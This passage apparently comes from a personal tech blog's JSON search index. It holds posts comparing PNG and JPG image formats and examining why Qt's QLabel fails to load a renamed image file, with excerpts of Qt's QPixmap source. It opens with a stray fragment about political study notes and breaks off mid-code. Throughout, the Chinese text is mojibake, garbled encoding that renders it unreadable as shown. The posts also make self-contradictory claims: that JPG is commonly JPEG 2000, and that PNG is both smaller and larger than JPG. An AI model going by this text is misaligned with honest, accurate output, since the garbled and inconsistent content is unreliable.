è¿‘å¹³ç«‹è¶³äºæˆ‘è´µå“¦ç§‘å­¦æŠ€æœ¯ä¸ç¤¾ä¼šå‘å±•çš„ç°å®éœ€è¦ï¼Œæå‡ºäº†ä¸€ç³»åˆ—å…³äºç§‘å­¦æŠ€æœ¯å‘å±•çš„ç†è®ºè§‚ç‚¹ï¼Œå½¢æˆäº†ä¹ è¿‘å¹³æ–°æ—¶ä»£ä¸­å›½ç‰¹è‰²ç¤¾ä¼šä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚ã€‚ å‚è€ƒé“¾æ¥ï¼š 2019è‡ªç„¶è¾©è¯æ³•è¯¾åæ€è€ƒé¢˜åŠç­”æ¡ˆ_æ–‡æ¡£ä¹‹å®¶","tags":[{"name":"è€ƒç ”","slug":"è€ƒç ”","permalink":"https://hodlyounger.github.io/tags/%E8%80%83%E7%A0%94/"},{"name":"è€ƒç ”/æ”¿æ²»","slug":"è€ƒç ”-æ”¿æ²»","permalink":"https://hodlyounger.github.io/tags/%E8%80%83%E7%A0%94-%E6%94%BF%E6%B2%BB/"}],"categories":[{"name":"Z_æ‚è®°","slug":"Z-æ‚è®°","permalink":"https://hodlyounger.github.io/categories/Z-%E6%9D%82%E8%AE%B0/"}]},{"title":"pngå’Œjpgæ ¼å¼çš„å›¾ç‰‡(ä¸€)","date":"2023-10-27T01:24:02.558Z","path":"Z_æ‚è®°/pngå’Œjpgæ ¼å¼å›¾ç‰‡/","text":"[toc] jpg å’Œ png å›¾ç‰‡æ ¼å¼ åœ¨å†™è¿™ç¯‡æ–‡ç« ä¹‹å‰ï¼Œç¬”è€…åœ¨ç¼–å†™ä¸€ä¸ªç®€å•çš„ Qt ç¨‹åºæ—¶é‡åˆ°äº†è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼š é—®é¢˜ï¼šä¸€ä¸ªpngæ ¼å¼çš„å›¾ç‰‡æ”¹æˆåç¼€ä¸ºjpgæ ¼å¼çš„å›¾ç‰‡æ—¶ï¼ŒQLabelæ— æ³•è¯»å–çš„é—®é¢˜ã€‚ç¬”è€…æ˜¯é€šè¿‡setStyleSheet()ã€QImageã€QPixmapçš„æ¥å£å‡å°è¯•è¿‡å°†æ”¹åç¼€åå›¾ç‰‡è®¾ç½®åˆ°QLabelä¸­ï¼Œå‡ä»¥å¤±è´¥å‘Šç»ˆã€‚ ç‰¹æ­¤ç ”ç©¶äº†ä¸€ä¸‹è¿™jpgå’Œpngä¸¤è€…ä¹‹é—´çš„åŒºåˆ«ï¼Œåç»­å†ç ”ç©¶ä¸€ä¸‹Qtå…³äºç›¸å…³æ ¼å¼å›¾ç‰‡è¯»å–çš„é—®é¢˜ã€‚ å›¾ç‰‡ä¼šæœ‰jpgå’Œpngä¸¤ç§æ ¼å¼ï¼Œé‚£ä¹ˆè¿™ä¿©ç§æ ¼å¼çš„å›¾ç‰‡åˆæœ‰ç€ä»€ä¹ˆæ ·çš„åŒºåˆ«å‘¢ï¼Ÿä¸‹é¢å°±ç»™å¤§å®¶åˆ†äº«ä¸€ä¸‹ã€‚ pngå’Œjpgéƒ½æ˜¯å¸¸ç”¨çš„å›¾ç‰‡æ ¼å¼ï¼Œå…¶ä¸­pngå±äºæ— æŸå‹ç¼©ï¼Œjpgæ˜¯æœ‰æŸå‹ç¼©ï¼Œä½¿ç”¨ä¸­ä¸¤è€…æœ€æ˜æ˜¾çš„ä¸€ä¸ªåŒºåˆ«æ˜¯: pngæ”¯æŒé€æ˜é€šé“ jpgçš„å›¾ç‰‡æ›´é€‚åˆåœ¨ç½‘ç»œä¸­ä¼ æ’­å’Œä½¿ç”¨ã€‚ jpgæ ¼å¼ **jpgï¼š**æ˜¯JPEGæ ‡å‡†çš„äº§ç‰©ï¼Œä¹Ÿæ˜¯ç›®å‰ç½‘ç»œæœ€ä¸ºæµè¡Œçš„å›¾ç‰‡æ ¼å¼ï¼Œjpgæ ¼å¼çš„å›¾ç‰‡å¯ä»¥å°†å›¾åƒæ–‡ä»¶å‹ç¼©åˆ°æœ€å°æ ¼å¼ï¼Œåœ¨é«˜åº¦å‹ç¼©ç‡çš„åŒæ—¶ï¼Œå¯ä»¥å±•ç°æ˜¯åˆ†ä¸°å¯Œç”ŸåŠ¨çš„å›¾åƒï¼Œä½†æ˜¯éšç€å‹ç¼©æ¯”çš„å¢å¤§ï¼Œå›¾ç‰‡çš„å“è´¨ä¼šé€æ¸é™ä½çš„ã€‚æˆ‘ä»¬ç°åœ¨å¸¸ç”¨çš„jpgçš„æ ‡å‡†å…¨ç¨‹ä¸ºJPEG 2000æ ‡å‡†ï¼Œæœ‰ä»¥ä¸‹å‡ ç‚¹ç‰¹æ€§ï¼š é«˜å‹ç¼©ç‡ æ— æŸå‹ç¼©å’Œæœ‰æŸå‹ç¼© æ¸è¿›ä¼ è¾“ æ„Ÿå…´è¶£åŒºåŸŸå‹ç¼© ç æµçš„éšæœºè®¿é—®å’Œå¤„ç† å®¹é”™æ€§ åŸºäºå†…å®¹çš„æè¿° pngæ ¼å¼ **pngï¼š**æ˜¯ä¸€ç§é‡‡ç”¨æ— æŸå‹ç¼©ç®—æ³•çš„ä½å›¾æ¨¡å¼ï¼Œå…¶è®¾è®¡ç›®çš„æ˜¯è§†å›¾æ›¿ä»£GIFå’ŒTIFFæ–‡ä»¶æ ¼å¼ï¼ŒåŒæ—¶å¢åŠ ä¸€ä¸‹GIFæ–‡ä»¶æ ¼å¼æ‰€ä¸å…·å¤‡çš„ç‰¹æ€§ã€‚PNGä½¿ç”¨ä»LZ77æ´¾ç”Ÿçš„æ— æŸæ•°æ®å‹ç¼©ç®—æ³•ï¼Œä¸€èˆ¬åº”ç”¨äºJAVAç¨‹åºã€ç½‘é¡µæˆ–S60ç¨‹åºä¸­ï¼ŒåŸå› å°±æ˜¯å› ä¸ºpngçš„å‹ç¼©æ¯”æ›´é«˜ï¼Œç”Ÿæˆæ–‡ä»¶ä½“ç§¯å°ã€‚pngå›¾ç‰‡ä¹Ÿæœ‰ä¸€äº›ç‰¹æ€§ï¼š ä½“ç§¯å° æ— æŸå‹ç¼© ç´¢å¼•å½©è‰²æ¨¡å¼ æ›´ä¼˜åŒ–çš„ç½‘ç»œä¼ è¾“æ˜¾ç¤º æ”¯æŒé€æ˜æ¨¡å¼ å…³äº png æ ¼å¼è¿˜éœ€è¦è¯´æ˜çš„æ˜¯ï¼š pngæ ¼å¼æœ‰8ä½ã€24ä½ã€32ä½ä¸‰ç§å½¢å¼ï¼Œå…¶ä¸­8ä½PNGæ”¯æŒä¸¤ç§ä¸åŒçš„é€æ˜å½¢å¼ï¼ˆç´¢å¼•é€æ˜å’Œalphaé€æ˜ï¼‰ï¼Œ24ä½PNGä¸æ”¯æŒé€æ˜ï¼Œ32ä½PNGåœ¨24ä½åŸºç¡€ä¸Šå¢åŠ äº†8ä½é€æ˜é€šé“ï¼Œå› æ­¤å¯å±•ç°256çº§é€æ˜ç¨‹åº¦ã€‚ PNG8å’ŒPNG24åé¢çš„æ•°å­—åˆ™æ˜¯ä»£è¡¨è¿™ç§PNGæ ¼å¼æœ€å¤šå¯ä»¥ç´¢å¼•å’Œå­˜å‚¨çš„é¢œè‰²å€¼ã€‚8ä»£è¡¨2çš„8æ¬¡æ–¹ä¹Ÿå°±æ˜¯256è‰²ï¼Œè€Œ24åˆ™ä»£è¡¨2çš„24æ¬¡æ–¹å¤§æ¦‚æœ‰1600å¤šä¸‡è‰²ã€‚ åŒºåˆ«ï¼špng å’Œ jpg è½¬è‡ªç™¾åº¦ç™¾ç§‘ï¼š 1ã€JPEGå¯ä»¥å¯¹ç…§ç‰‡ï¼ˆæˆ–ç±»ä¼¼ï¼‰å›¾åƒç”Ÿæˆæ›´å°çš„æ–‡ä»¶ï¼Œè¿™æ˜¯ç”±äºJPEGé‡‡ç”¨äº†ä¸€ç§é’ˆå¯¹ç…§ç‰‡å›¾åƒçš„ç‰¹å®šæœ‰æŸç¼–ç æ–¹æ³•ï¼Œè¿™ç§ç¼–ç é€‚ç”¨äºä½å¯¹æ¯”ï¼Œå›¾åƒé¢œè‰²è¿‡æ¸¡å¹³æ»‘ï¼Œå™ªå£°å¤šï¼Œä¸”ç»“æ„ä¸è§„åˆ™çš„æƒ…å†µä¸‹ã€‚å¦‚æœåœ¨è¿™ç§æƒ…å†µä¸‹ç”¨PNGä»£æ›¿JPEGï¼Œæ–‡ä»¶å°ºå¯¸å¢å¤§å¾ˆå¤šï¼Œè€Œå›¾åƒè´¨é‡çš„æé«˜æœ‰é™ã€‚ç›¸åº”çš„ï¼Œå¦‚æœä¿å­˜æ–‡æœ¬ï¼Œçº¿æ¡æˆ–ç±»ä¼¼çš„è¾¹ç¼˜æ¸…æ™°ï¼Œæœ‰å¤§å—ç›¸åŒé¢œè‰²åŒºåŸŸçš„å›¾åƒï¼ŒPNGæ ¼å¼çš„å‹ç¼©æ•ˆæœå°±è¦æ¯”JPEGå¥½å¾ˆå¤šï¼Œå¹¶ä¸”ä¸ä¼šå‡ºç°JPEGé‚£æ ·çš„é«˜å¯¹æ¯”åº¦åŒºåŸŸçš„å›¾åƒæœ‰æŸã€‚å¦‚æœå›¾åƒæ—¢æœ‰æ¸…æ™°è¾¹ç¼˜ï¼Œåˆæœ‰ç…§ç‰‡å›¾åƒçš„ç‰¹ç‚¹ï¼Œå°±åœ¨åœ¨è¿™ä¸¤ç§æ ¼å¼ä¹‹é—´æƒè¡¡ä¸€ä¸‹äº†ã€‚JPEGä¸æ”¯æŒé€æ˜åº¦ã€‚ 2ã€ç”±äºJPEGæ˜¯æœ‰æŸå‹ç¼©ï¼Œä¼šäº§ç”Ÿè¿­ä»£æœ‰æŸï¼Œåœ¨é‡å¤å‹ç¼©å’Œè§£ç çš„è¿‡ç¨‹ä¸­ä¼šä¸æ–­ä¸¢å¤±ä¿¡æ¯ä½¿å›¾åƒè´¨é‡ä¸‹é™ã€‚ç”±äºPNGæ˜¯æ— æŸçš„ï¼Œä¿å­˜å°†è¦è¢«ç¼–è¾‘çš„å›¾åƒæ¥è¯´æ›´åŠ åˆé€‚ã€‚è™½ç„¶PNGå‹ç¼©ç…§ç‰‡å›¾åƒä¹Ÿæœ‰æ•ˆï¼Œä½†æœ‰ä¸“é—¨é’ˆå¯¹ç…§ç‰‡å›¾åƒè®¾è®¡çš„æ— æŸå‹ç¼©æ ¼å¼ï¼Œæ¯”å¦‚æ— æŸJPEG2000ï¼ŒAdobe DNGç­‰ã€‚æ€»çš„æ¥è¯´è¿™äº›æ ¼å¼éƒ½ä¸èƒ½åšåˆ°é€‚ç”¨æ‰€æœ‰å›¾åƒã€‚å¯¹äºå°†è¦å‘å¸ƒçš„å›¾åƒå¯ä»¥ä¿å­˜æˆJPEGï¼Œç”¨JPEGç¼–ç ä¸€æ¬¡ä¸ä¼šé€ æˆæ˜æ˜¾çš„å›¾åƒæœ‰æŸã€‚ æ€»ç»“å°±æ˜¯ï¼š jpgæ ¼å¼çš„å›¾ç‰‡èƒ½åœ¨é«˜åº¦å‹ç¼©ç‡çš„åŒæ—¶ï¼Œå±•ç°ååˆ†ä¸°å¯Œç”ŸåŠ¨çš„å›¾åƒï¼Œä½†æ˜¯éšç€å‹ç¼©æ¯”çš„å¢å¤§ï¼Œå›¾ç‰‡çš„å“è´¨ä¼šé€æ¸é™ä½çš„ã€‚è€Œpngå›¾ç‰‡çš„ç‰¹æ€§å°±æ˜¯ä½“ç§¯å°ï¼ŒèŠ‚çº¦ç©ºé—´ï¼Œä¸jpgå›¾ç‰‡ç›¸æ¯”ï¼Œpngå›¾ç‰‡æ—¶æ— æŸå‹ç¼©ï¼Œåœ¨ä¸æŸå¤±å›¾ç‰‡æ•°æ®çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥å¿«é€Ÿçš„è·å–è‡ªå·±æƒ³è¦çš„å›¾ç‰‡ï¼Œè€Œä¸”å›¾ç‰‡çš„è´¨é‡å¹¶ä¸ä¼šä¸‹é™ã€‚ pngæ ¼å¼çš„å›¾ç‰‡å¯ä»¥ç¼–è¾‘ï¼Œæ¯”å¦‚å›¾ç‰‡ä¸­çš„å­—ä½“ã€çº¿æ¡ç­‰ï¼Œå¯ä»¥é€šè¿‡psç­‰è½¯ä»¶æ›´æ”¹ã€‚ä½†æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡åˆ™ä¸å¯ä»¥æ›´æ”¹ï¼Œpngä¸jpgå›¾ç‰‡ç›¸æ¯”pngæ ¼å¼çš„å›¾ç‰‡æ›´å¤§ã€‚","tags":[{"name":"å›¾ç‰‡","slug":"å›¾ç‰‡","permalink":"https://hodlyounger.github.io/tags/%E5%9B%BE%E7%89%87/"},{"name":"æ ¼å¼","slug":"æ ¼å¼","permalink":"https://hodlyounger.github.io/tags/%E6%A0%BC%E5%BC%8F/"}],"categories":[{"name":"Z_æ‚è®°","slug":"Z-æ‚è®°","permalink":"https://hodlyounger.github.io/categories/Z-%E6%9D%82%E8%AE%B0/"}]},{"title":"ã€Qtã€‘pngå’Œjpgæ ¼å¼çš„å›¾ç‰‡(äºŒ)","date":"2023-10-27T01:24:02.557Z","path":"B_Code/Qt/ã€Qtã€‘pngå’Œjpgæ ¼å¼çš„å›¾ç‰‡/","text":"[TOC] èƒŒæ™¯ åœ¨ä¸Šç¯‡æ–‡ç«  pngå’Œjpgæ ¼å¼å›¾ç‰‡ ä¸­ç¬”è€…å°± jpg å’Œ png ä¸¤ç§æ ¼å¼è¿›è¡Œäº†è¯´æ˜ï¼Œä½†æ˜¯å…³äº Qt æ‰“å¼€æ”¹åç¼€æ–‡ä»¶åä¹‹åå›¾ç‰‡çš„é—®é¢˜ä¾ç„¶æ²¡æœ‰è¯´æ˜ã€‚è¦æ¢ç©¶Qtä¸ºä½•ä¸èƒ½æ‰“å¼€æ”¹äº†åç¼€çš„å›¾ç‰‡æ–‡ä»¶ï¼Œè¿™ä¸ªè¿˜æ˜¯å¾—ä»å¤šæ–¹é¢å»å®šä½ã€‚å‰æ–‡è¯´äº†ï¼Œé€šè¿‡ä¸‰ç§æ–¹å¼è®¾ç½®äº† QLabel çš„å›¾ç‰‡ã€‚ åœºæ™¯å¤ç° è¿™é‡Œè¿˜æ˜¯å…ˆè¯´æ˜ä¸€ä¸‹è®¾ç½®ä¸æˆåŠŸçš„åœºæ™¯å¦‚ä½•å¤ç°: æ‰¾ä¸€å¼  .jpg çš„å›¾ç‰‡ï¼Œä¿®æ”¹åç¼€ä¹Ÿå°±æ˜¯æ–‡ä»¶å±æ€§ä¸º .png é€šè¿‡ä»¥ä¸‹ä¸‰ç§æ–¹å¼ä¸­çš„ä»»æ„ä¸€ç§å»è®¾ç½® QLabel ä¸ºå›¾ç‰‡ã€‚ Qt ç‰ˆæœ¬æ˜¯ 5.9 ç¼–è¯‘å™¨è¯•äº† MSVC å’Œ mingw éƒ½ä¸å¥½ä½¿ã€‚ QLabel è®¾ç½®å›¾ç‰‡æ–¹æ³• é€šè¿‡ QPixmapè®¾ç½® QLabel çš„å›¾ç‰‡ 1234QPixmap img(&quot;:/Win11.png&quot;);ui-&gt;label-&gt;setPixmap(img);ui-&gt;label-&gt;setScaledContents(true); é€šè¿‡ QImage è®¾ç½® QLabel çš„å›¾ç‰‡ 123QImage img;img.load(&quot;:/Win11.png&quot;);ui-&gt;label-&gt;setPixmap(QPixmap::fromImage(img)) é€šè¿‡ QLabel.setStyleSheet() çš„å›¾ç‰‡ 123ui-&gt;label-&gt;setStyleSheet(QString(&quot;QLabel&#123;&quot; &quot;border-image:url(:/Win11.png) 4 4 4 4 stretch stretch;&quot; &quot;&#125;&quot;)); å½“ç„¶è¿˜æœ‰ç¬¬å››ç§æ–¹æ³•ï¼Œé€šè¿‡ QSvgRenderer è®¾ç½®ï¼š 1234567#include &lt;QSvgRenderer&gt;QSvgRenderer svgRender(QString(&quot;:/Win11.svg&quot;));QPixmap pixmap(20,20);QPainter painter(&amp;pixmap);svgRender.render(&amp;painter);ui-&gt;label-&gt;setPixmap(pixmap); åœºæ™¯æ˜¯æè¿°å®Œäº†ï¼Œå¯ä»¥åŠ¨æ‰‹å°è¯•äº† æ“ä½œ æ¥ç€å°±æ˜¯å»æŸ¥çœ‹å‡ ç§å®ç°æ–¹å¼ä¸­çš„æºç æ˜¯å¦‚ä½•æ˜¯è®¾ç½®çš„äº†ï¼Œè¿™é‡Œå…ˆçŒœä¸€ä¸‹ç»“è®º å°±æ˜¯ png å’Œ jpg æ ¼å¼çš„ç®—æ³•ä¸åŒï¼Œæ ¼å¼é—®é¢˜å¯¼è‡´çš„è¯»å–çš„ç®—æ³•ä¸ä¸€è‡´ï¼Œå› æ­¤Qtå†…éƒ¨å®ç°çš„è¯»å–å›¾ç‰‡çš„ç®—æ³•åªèƒ½æ ¹æ®å›¾ç‰‡æ–‡ä»¶çš„åç¼€æ‰€å¯¹åº”çš„ç®—æ³•å»è¯»å–ç®—æ³•ï¼Œè€Œ setStyleSheet ç®—æ³•ä¹Ÿæ˜¯åŸºäºè¿™ä¹ˆä¸€ä¸ªé€»è¾‘ï¼Œå› æ­¤ä¸‰ç§è¯»å–æ–¹å¼éƒ½ä¸æˆåŠŸã€‚ å…³äºå›¾ç‰‡ç®—æ³•çš„é—®é¢˜ï¼Œåœ¨ä¸Šç¯‡æ–‡ç«  pngå’Œjpgæ ¼å¼å›¾ç‰‡ ä¸­ä¹Ÿç•¥å¾®æåˆ°ï¼Œè¿™ä¸ªæˆ‘ä»¬ä¸æ·±åšç ”ç©¶ï¼Œåªéœ€çŸ¥é“ jpg å’Œ png ä¸æ˜¯åŒä¸€ç§ç®—æ³•ï¼Œä¹Ÿä¸é€šç”¨å³å¯ã€‚ åˆæ­¥éªŒè¯ å› ä¸ºä¸Šè¿°å‡ ç§æ­¥éª¤ç¬”è€…éƒ½åšè¿‡å°è¯•ï¼Œå› æ­¤åœ¨éªŒè¯è¿‡ç¨‹ä¸­æˆ‘ä»¬ä¸çº ç»“äºä½¿ç”¨å“ªä¸€ç§æ–¹å¼ï¼Œç›´æ¥çœ‹ç»“æœã€‚ é‚£å¦‚ä½•å»éªŒè¯å‘¢ï¼Œæˆ‘ä»¬è¿˜æ˜¯çœ‹ä»£ç ï¼Œè¿™æ¬¡æˆ‘ä»¬åœ¨ Qt çš„ qrc æ–‡ä»¶ä¸­ï¼Œå»æ‰å›¾ç‰‡çš„åç¼€åï¼Œä¸å¸¦åç¼€å±æ€§å»è¯»å–å›¾ç‰‡çœ‹çœ‹å…¶æ˜¯å¦å¯ä»¥è¯»å–æˆåŠŸã€‚ è¿è¡Œç»“æœ: QLabel è¯»å–æˆåŠŸ å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œåœ¨ qrc æ–‡ä»¶ä¸­å»æ‰å›¾ç‰‡çš„åç¼€ï¼Œè¯»å–å›¾ç‰‡è®¾ç½®åˆ° QLabel ä¾ç„¶æ˜¯æˆåŠŸçš„ã€‚ æˆ‘ä»¬æ¥ç€æ“ä½œï¼Œåœ¨ä»£ç ä¸­ä¿®æ”¹å›¾ç‰‡åç¼€ä¸º pngï¼Œçœ‹çœ‹è¿™æ¬¡èƒ½ä¸èƒ½è¯»å–æˆåŠŸã€‚ è¿è¡Œç»“æœï¼šè¯»å–å¤±è´¥ å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œæ·»åŠ åç¼€ååè€Œè¿˜å±•ç¤ºä¸æˆåŠŸäº†ã€‚ åˆæ­¥éªŒè¯çš„ç»“æœ è¿™å°±åŸºæœ¬ä¸Šè¯´æ˜äº†ï¼š åœ¨ Qt çš„å†…éƒ¨æœ‰å¾ˆå¤§çš„å‡ ç‡æ˜¯é€šè¿‡æ–‡ä»¶çš„åç¼€å»åˆ¤æ–­è°ƒç”¨å“ªä¸ªå›¾ç‰‡è¯»å–ç®—æ³•çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“ä½ äººä¸ºçš„ä¿®æ”¹äº† png-&gt;jpg æ—¶ï¼Œåœ¨ Qt ä¸­å°±ä¼šå‡ºç°è®¾ç½®å›¾ç‰‡å¤±è´¥çš„é—®é¢˜ã€‚ç›®å‰çœ‹æ¥ï¼Œåœ¨ä»£ç æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯å›¾ç‰‡è®¾ç½®åä¸æ˜¾ç¤ºçš„æƒ…å†µä¸‹ï¼Œæœ€å¥½çš„æ–¹å¼æ˜¯ï¼Œå°±æ˜¯å»æ‰å›¾ç‰‡çš„åç¼€ï¼Œè®© Qt è‡ªå·±å»åˆ¤æ–­è°ƒç”¨å“ªä¸ªç®—æ³•è¯»å–å›¾ç‰‡ã€‚ æºç åˆ†æ è¿™é‡Œæœ‰å…³äº Qt å›¾ç‰‡ I\\O çš„æè¿°å¯ä»¥çœ‹çœ‹Qtå¸®åŠ©æ‰‹å†Œä¸­å…³äºå›¾åƒæ–‡ä»¶è¯»å†™çš„æ–‡æ¡£ã€‚ æºç éƒ¨åˆ†ï¼Œæˆ‘ä»¬åªéœ€æŸ¥çœ‹ä¸¤ä¸ªQt ç±»å°±è¡Œï¼Œä¸ªäººæ„Ÿè§‰çœ‹ä¸€ä¸ªå°±çŸ¥é“äº†ã€‚ä¸¤è€…è¯†åˆ«å›¾ç‰‡çš„ç®—æ³•åº”è¯¥æ˜¯ä¸€è‡´çš„ã€‚åŒ…æ‹¬ setStyleSheet()æ¥å£ä¸­è®¾ç½®å›¾ç‰‡çš„æ¥å£åº”è¯¥éƒ½æ˜¯ä¸€è‡´çš„ã€‚ QPixmapä¾èµ–äºæ‰€åœ¨çš„å¹³å°çš„ç»˜å›¾å¼•æ“ï¼Œæ•…ä¾‹å¦‚åé”¯é½¿ç­‰ä¸€äº›æ•ˆæœåœ¨ä¸åŒçš„å¹³å°ä¸Šå¯èƒ½ä¼šæœ‰ä¸åŒçš„æ˜¾ç¤ºæ•ˆæœï¼ŒQImageä½¿ç”¨Qtè‡ªèº«çš„ç»˜å›¾å¼•æ“ï¼Œå¯åœ¨ä¸åŒå¹³å°ä¸Šå…·æœ‰ç›¸åŒçš„æ˜¾ç¤ºæ•ˆæœ ç›®å‰çš„Qtä¼šæŠŠQPixmapéƒ½å­˜å‚¨åœ¨graphics memoryä¸­ï¼ŒQImageæ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯çš„ï¼Œæ˜¯ç‹¬ç«‹äºç¡¬ä»¶çš„ã€‚åœ¨X11, Mac ä»¥åŠ Symbianå¹³å°ä¸Šï¼ŒQPixmap æ˜¯å­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯ï¼Œè€ŒQImageåˆ™æ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯ï¼Œåœ¨Windowså¹³å°ä¸Šï¼ŒQPixmapå’ŒQImageéƒ½æ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯ï¼Œå¹¶ä¸ä½¿ç”¨ä»»ä½•çš„GDIèµ„æºã€‚ ç”±äºQImageæ˜¯ç‹¬ç«‹äºç¡¬ä»¶çš„ï¼Œä¹Ÿæ˜¯ä¸€ç§QPaintDeviceï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨å¦ä¸€ä¸ªçº¿ç¨‹ä¸­å¯¹å…¶è¿›è¡Œç»˜åˆ¶ï¼Œè€Œä¸éœ€è¦åœ¨GUIçº¿ç¨‹ä¸­å¤„ç†ï¼Œä½¿ç”¨è¿™ä¸€æ–¹å¼å¯ä»¥å¾ˆå¤§å¹…åº¦æé«˜UIå“åº”é€Ÿåº¦ã€‚ QPixmap æŸ¥è¯¢åˆ°QPixmapçš„æºæ–‡ä»¶ï¼Œä¸€èˆ¬å­˜æ”¾åœ¨ Qt å®‰è£…ç›®å½•ä¸‹ $&#123;å®‰è£…ç›®å½•&#125;\\5.9.9\\Src\\qtbase\\src\\gui\\imageï¼Œæ–‡ä»¶åä¸º qpixmap.h qpixmap.cpp å…ˆçœ‹ä¸€ä¸‹ QPixmap çš„ æ„é€ å‡½æ•°ä¸­è¯»å–å›¾ç‰‡æ–‡ä»¶çš„æ–¹æ³•ã€‚ QPixmap::QPixmap(const QString&amp; fileName, const char *format, Qt::ImageConversionFlags flags)çš„æºç  123456789QPixmap::QPixmap(const QString&amp; fileName, const char *format, Qt::ImageConversionFlags flags) : QPaintDevice() &#123; doInit(0, 0, QPlatformPixmap::PixmapType); if (!qt_pixmap_thread_test()) return; load(fileName, format, flags); // è¿™é‡Œçœ‹åˆ°è°ƒç”¨äº†load()çš„æ¥å£ï¼Œæ¥ç€æŸ¥çœ‹loadæ˜¯å¦‚ä½•å®ç°çš„ &#125; load()å‡½æ•°æºç  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879/*! Loads a pixmap from the file with the given \\a fileName. Returns true if the pixmap was successfully loaded; otherwise invalidates the pixmap and returns \\c false. The loader attempts to read the pixmap using the specified \\a format. If the \\a format is not specified (which is the default), the loader probes the file for a header to guess the file format. The file name can either refer to an actual file on disk or to one of the application&#x27;s embedded resources. See the \\l&#123;resources.html&#125;&#123;Resource System&#125; overview for details on how to embed pixmaps and other resource files in the application&#x27;s executable. If the data needs to be modified to fit in a lower-resolution result (e.g. converting from 32-bit to 8-bit), use the \\a flags to control the conversion. Note that QPixmaps are automatically added to the QPixmapCache when loaded from a file; the key used is internal and can not be acquired. \\sa loadFromData(), &#123;QPixmap#Reading and Writing Image Files&#125;&#123;Reading and Writing Image Files&#125;*//* ç¿»è¯‘è¿‡æ¥å°±æ˜¯ä»ç»™å®šçš„æ–‡ä»¶åçš„æ–‡ä»¶ä¸­åŠ è½½ä¸€ä¸ªåƒç´ å›¾ã€‚å¦‚æœpixmapæˆåŠŸåŠ è½½ï¼Œåˆ™ä¸ºTrue;å¦åˆ™è¿”å›æ— æ•ˆpixmapå¹¶è¿”å›\\c falseã€‚åŠ è½½å™¨å°è¯•ä½¿ç”¨æŒ‡å®šçš„\\aè¯»å–pixmapæ ¼å¼ã€‚å¦‚æœæ²¡æœ‰æŒ‡å®š\\aæ ¼å¼(è¿™æ˜¯é»˜è®¤çš„)ï¼ŒåŠ è½½å™¨æ¢æµ‹æ–‡ä»¶çš„å¤´ï¼Œä»¥çŒœæµ‹æ–‡ä»¶çš„æ ¼å¼ã€‚æ–‡ä»¶åå¯ä»¥æŒ‡å‘ç£ç›˜ä¸Šçš„å®é™…æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æŒ‡å‘ç£ç›˜ä¸Šçš„å®é™…æ–‡ä»¶åº”ç”¨ç¨‹åºçš„åµŒå…¥å¼èµ„æºã€‚çœ‹åˆ°\\l&#123;resources.html&#125;&#123;Resource System&#125;æ¦‚è¿°å¦‚ä½•åµŒå…¥pixmapå’Œå…¶ä»–èµ„æºæ–‡ä»¶åœ¨åº”ç”¨ç¨‹åºçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚å¦‚æœæ•°æ®éœ€è¦ä¿®æ”¹ä»¥é€‚åº”ä½åˆ†è¾¨ç‡ç»“æœ(ä¾‹å¦‚ä»32ä½è½¬æ¢åˆ°8ä½)ï¼Œä½¿ç”¨\\aæ ‡å¿—æ¥æ§åˆ¶è½¬æ¢ã€‚æ³¨æ„ï¼Œqpixmapä¼šè‡ªåŠ¨æ·»åŠ åˆ°QPixmapCacheä¸­å½“ä»æ–‡ä»¶åŠ è½½æ—¶;ä½¿ç”¨çš„å¯†é’¥æ˜¯å†…éƒ¨çš„ï¼Œä¸èƒ½è¢«æ”¶è´­ã€‚\\sa loadFromData()ï¼Œ &#123;QPixmap#è¯»å†™å›¾åƒè¯»å†™å›¾åƒæ–‡ä»¶&#125;*/// loadFromdataçš„æºç æˆ‘ä¹Ÿè¡¥å……åˆ°äº†æ–‡æœ«bool QPixmap::load(const QString &amp;fileName, const char *format, Qt::ImageConversionFlags flags)&#123; if (!fileName.isEmpty()) &#123; QFileInfo info(fileName); // Note: If no extension is provided, we try to match the // file against known plugin extensions if (info.completeSuffix().isEmpty() || info.exists()) &#123; QString key = QLatin1String(&quot;qt_pixmap&quot;) % info.absoluteFilePath() % HexString&lt;uint&gt;(info.lastModified().toSecsSinceEpoch()) % HexString&lt;quint64&gt;(info.size()) % HexString&lt;uint&gt;(data ? data-&gt;pixelType() : QPlatformPixmap::PixmapType); if (QPixmapCache::find(key, this)) return true; data = QPlatformPixmap::create(0, 0, data ? data-&gt;pixelType() : QPlatformPixmap::PixmapType); if (data-&gt;fromFile(fileName, format, flags)) &#123; QPixmapCache::insert(key, *this); return true; &#125; &#125; &#125; if (!isNull()) &#123; if (isQBitmap()) *this = QBitmap(); else data.reset(); &#125; return false;&#125; ä¸€çœ‹æºç æ˜¯ä¸æ˜¯å°±æ¸…æ™°å¤šäº†ã€‚åœ¨ load()å‡½æ•°çš„å®ç°ä¸­ï¼šâ‘ åˆ¤æ–­æ–‡ä»¶åæ˜¯ä¸æ˜¯ä¸ºç©ºï¼›â‘¡ä¸ä¸ºç©ºæ—¶ï¼Œé¦–å…ˆå°±æ˜¯è¯»å–æ–‡ä»¶çš„åç¼€ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç»†ç»†æŸ¥ä¸€ä¸‹ç¬¬äºŒä¸ª if åˆ¤æ–­ä¸­ QString ç±»å‹çš„ key åˆ°åº•æ˜¯è¿›è¡Œäº†ä¸€ä¸ªä»€ä¹ˆæ“ä½œã€‚ 12345QString key = QLatin1String(&quot;qt_pixmap&quot;) % info.absoluteFilePath() // è¿”å›æ–‡ä»¶åçš„ç»å¯¹è·¯å¾„ % HexString&lt;uint&gt;(info.lastModified().toSecsSinceEpoch()) // 